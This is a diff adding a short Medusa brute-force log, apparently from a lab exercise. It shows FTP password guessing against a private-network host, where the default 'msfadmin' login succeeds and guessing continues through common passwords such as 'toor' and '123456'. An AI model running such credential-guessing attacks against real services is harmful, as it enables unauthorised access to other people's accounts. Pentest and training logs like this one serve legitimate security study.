@@ -1,0 +1,9 @@
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-11-25 12:54:12 ACCOUNT CHECK: [ftp] Host: 172.17.54.106 (1 of 1, 0 complete) User: msfadmin (1 of 10, 0 complete) Password: msfadmin (1 of 12 complete)
+2026-11-25 12:54:12 ACCOUNT FOUND: [ftp] Host: 172.17.54.106 User: msfadmin Password: msfadmin [SUCCESS]
+2026-11-25 12:54:14 ACCOUNT CHECK: [ftp] Host: 172.17.54.106 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: admin (2 of 12 complete)
+2026-11-25 12:54:14 ACCOUNT CHECK: [ftp] Host: 172.17.54.106 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: toor (3 of 12 complete)
+2026-11-25 12:54:14 ACCOUNT CHECK: [ftp] Host: 172.17.54.106 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: password (4 of 12 complete)
+2026-11-25 12:54:14 ACCOUNT CHECK: [ftp] Host: 172.17.54.106 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: root (5 of 12 complete)
+2026-11-25 12:54:14 ACCOUNT CHECK: [ftp] Host: 172.17.54.106 (1 of 1, 0 complete) User: msfadmin (1 of 10, 1 complete) Password: 123456 (6 of 12 complete)
